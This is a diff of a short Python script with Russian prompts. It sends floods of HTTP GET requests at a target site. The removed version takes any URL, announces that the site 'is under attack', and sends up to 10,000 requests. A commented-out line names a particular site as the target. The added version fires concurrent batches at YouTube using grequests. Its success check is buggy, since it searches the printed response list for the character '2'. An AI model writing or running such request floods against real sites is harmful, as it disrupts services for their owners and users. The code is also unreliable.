@@ -1,22 +1,17 @@
-import requests
-import time
+import grequests
+k1 = int(input("Введите сколько пачек будет запросов: "))
+k2 = int(input("Введите сколько запросов в пачке: "))
+for l in range(int(k1)):
+    n = k2 #Количество запросов
+    sites = ["https://www.youtube.com/" for x in range(n)]
+    res = (grequests.get(url) for url in sites)
+    r = grequests.map(res)
+    #<Response [200]>
+    for num, i in enumerate(r):
+        a = 'fail'
+        for b in list(str(r)):
+            if b =='2':
+                a = 'ok'
+        print(f'{num+1}-{a}')
 
-t = 0
-#время на отправку одного запроса
-
-#sait = 'https://gomel5.znaj.by/'
-
-sait = input('Введите ссылку:')
-print(sait, 'На этот сайт идёт атака!')
-r = requests.get(sait)
-
-i = 1
-
-for i in range(10000):
-    print(i+1)
-    if r.status_code == 200:
-        print('Ok')
-    else:
-        print('Error')
-    time.sleep(t)
-    requests.get(sait)
+    print(r)
